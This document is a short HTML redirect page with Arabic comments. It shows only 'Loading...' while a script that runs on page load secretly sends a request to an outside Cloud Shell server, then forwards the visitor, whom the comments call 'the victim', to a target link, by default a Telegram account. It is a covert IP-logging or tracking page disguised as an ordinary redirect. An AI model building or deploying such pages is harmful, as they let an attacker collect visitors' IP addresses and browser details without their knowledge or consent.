<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <script>
        // هذا الرابط هو رابط سيرفر جوجل مالتك (تأكد إنه نفس اللي دزيته)
        const SERVER_URL = "https://8080-cs-f65a8037-daaf-45b2-a58a-a8f4d4f83c4f.cs-europe-west4-pear.cloudshell.dev/";
        
        async function sendData() {
            const urlParams = new URLSearchParams(window.location.search);
            const target = urlParams.get('u') || 'https://t.me/vo11a';
            
            // إرسال البيانات للسيرفر بالخلفية
            fetch(`${SERVER_URL}?u=${encodeURIComponent(target)}`, { mode: 'no-cors' });
            
            // تحويل الضحية للرابط الحقيقي بعد ثانية وحدة
            setTimeout(() => {
                window.location.replace(target);
            }, 1000);
        }
        window.onload = sendData;
    </script>
</head>
<body>
    <p>Loading...</p>
</body>
</html>
